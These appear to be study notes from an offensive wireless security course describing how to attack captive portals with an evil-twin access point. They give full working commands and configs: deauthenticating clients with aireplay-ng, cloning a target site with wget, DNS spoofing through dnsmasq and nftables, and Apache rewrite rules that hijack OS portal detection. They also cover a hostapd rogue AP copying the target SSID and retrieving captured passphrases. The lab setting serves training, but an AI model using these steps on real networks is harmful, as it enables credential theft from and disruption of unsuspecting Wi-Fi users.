# 12. Attacking Captive Portals

Unencrypted or open network to allow guest or employees to easily connect to the network or internet, sometimes without credentials

*Think of it as Wireless@SG*

1. To attack a captive portal, have to know:
    - Channel
    - Encryption
    - Clients
    - If network is WPA-PSK or WPA2-PSK, capture handshake

1. Prepare captive portal, if target contains existing portal, can usually copy but have to make sure all resources are hosted locally. 

1. Configure and create rogue AP and run any necessary tools to help clients discover captive portal, force them to connect to us which allows capturing of user credentials

1. Credentials sent in clear text. Opportunistic Wireless Encryption (OWE) also sometimes called Enhanced Open, can encrypt the connection without requiring passphrase. This ensures that credentials sent are safe from interception while not all devices supports it. Most modern OS do

### Discovery

1. Run `sudo airmon-ng check kill` to kill process interfering with wireless card.
2. Run `sudo airmon-ng start wlan0` to start in monitor mode
3. Run `sudo airodump-ng` to capture info about clients and AP. Use `-w` and `--output-format pcap` to set output format to pcap
    
    `sudo airodump-ng -w discovery --output-format pcap wlan0mon`
    
4. Output saved as `discovery-01.cap`
5. Doesn’t matter if its on WPA1 or WPA2 since its open network on the same channel to trick clients to connect to us
6. Now intercept handshake from one of the clients. Wait for one to connect or reconnect, or use `aireplay-ng` to deauth clients. 
    
    `sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon` 
    

Now set up a captive portal that looks like the target:

1. install apache and php
    
    `sudo apt install apache2 libapache2-mod-php`
    
2. Download index page with all its resources, using wget. Use recursive `-r` and `-l2` 
    
    `wget -r -l2 https://www.megacorpone.com`
    

### Networking Setup

1. Assign IP Address to wlan0 interface. Use 192.168.87.1 with network mask of 255.255.255.0 IP used doesn’t matter once the user’s system detects that it can’t reach the internet, will automatically open IP address of the router in the browser which is also the host of the captive portal
    
    ```bash
    sudo ip addr add 192.168.87.1/24 dev wlan0
    sudo ip link set wlan0 up
    ```
    
2. Will need an IP configuration for clients to connect to us. We will use `dnsmasq` 
    
    `sudo apt install dnsmasq` 
    
    Use the following settings for mco-dnsmasq.conf
    
    Also need to do DNS spoofing, so that response for most DNS requests will point back to us with exception of rare cases. Added to the bottom
    
    ```bash
    # Main options
    # http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
    domain-needed
    bogus-priv
    no-resolv
    filterwin2k
    expand-hosts
    domain=localdomain
    local=/localdomain/
    # Only listen on this address. When specifying an
    # interface, it also listens on localhost.
    # We don't want to interrupt any local resolution
    # since the DNS responses will be spoofed
    listen-address=192.168.87.1
    
    # DHCP range
    dhcp-range=192.168.87.100,192.168.87.199,12h
    dhcp-lease-max=100
    
    # This should cover most queries
    # We can add 'log-queries' to log DNS queries
    address=/com/192.168.87.1
    address=/org/192.168.87.1
    address=/net/192.168.87.1
    
    # Entries for Windows 7 and 10 captive portal detection
    address=/dns.msftncsi.com/131.107.255.255
    ```
    
3. After setting up config file, start dnsmasq
    
    `sudo dnsmasq --conf-file=mco-dnsmasq.conf` 
    

1. Use netstat to confirm its listening on port 53 for DNS and 67 for DHCP
    
    `sudo netstat -lnp`
    
    ![Untitled](Untitled%208.png)
    
2. Sometimes clients ignore DNS settings in DHCP lease, use nftables rule to force redirect all DNS requests (UDP port 53, TCP port 53 is zone transfer) back to our server
    
    ```bash
    sudo apt install nftables
    sudo nft add table ip nat
    sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
    sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
    ```
    

1. In Apache site config, add mod_rewrite and mod_alias rules so that captive portal is set up properly. Edit the file **/etc/apache2/sites-enabled/000-default.conf** 
    
    ```bash
    ...
    
      # Apple
      RewriteEngine on
      RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
      RewriteCond %{HTTP_HOST} !^192.168.87.1$
      RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]
    
      # Android
      RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php
    
      # Windows 7 and 10
      RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
      RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php
    
      # Catch-all rule to redirect other possible attempts
      RewriteCond %{REQUEST_URI} !^/portal/ [NC]
      RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]
    
    </VirtualHost>
    ```
    
2. Then run `sudo a2enmod rewrite`
3. Then run `sudo a2enmod alias`
4. Then run `sudo a2enmod ssl`
5. Then restart apache using `sudo systemctl restart apache2` 

### Setting up and Running Rogue AP

1. Use hostapd to run AP
    1. `sudo apt install hostapd`
    
2. Create 802.11n AP with exact same SSID and channel as target AP without encrpytion
    
    ```bash
    interface=wlan0
    ssid=MegaCorp One Lab
    channel=11
    
    # 802.11n
    hw_mode=g
    ieee80211n=1
    
    # Uncomment the following lines to use OWE instead of an open network
    #wpa=2
    #ieee80211w=2
    #wpa_key_mgmt=OWE
    #rsn_pairwise=CCMP
    ```
    
3. Run hostapd to get credentials. Run it in the background
    
    `sudo hostapd -B mco-hostapd.conf` 
    
4. Then stand by and check for logs using:
    
    `sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'` 
    
    ![Untitled](Untitled%209.png)
    
    Look out for MAC address that is associated with the target AP and can see the received IP address from dnsmasq
    
5. Open another terminal to monitor incoming Apache logs
    
    `sudo tail -f /var/log/apache2/access.log`
    
    ![Untitled](Untitled%2010.png)
    
6. Look in **/tmp** directory and find **passphrase.txt**
    
    `sudo find /tmp/ -iname passphrase.txt`
    
    ```bash
    sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
    ```
    

Sometimes OS detect captive portals can be disabled in the settings. When they are started manually, browsers should detect and redirect to captive portal but again, this feature can be disabled as well. 

There are a few different unusual behaviors to be aware of. 

- Windows will not show captive portal after automatically connecting to network. To fix: user has to manually go into network list dialog again and select our network and click connect to work
- Chrome doesn’t automatically check for captive portals upon startup. Only detects them when manually typing a URL or doing a search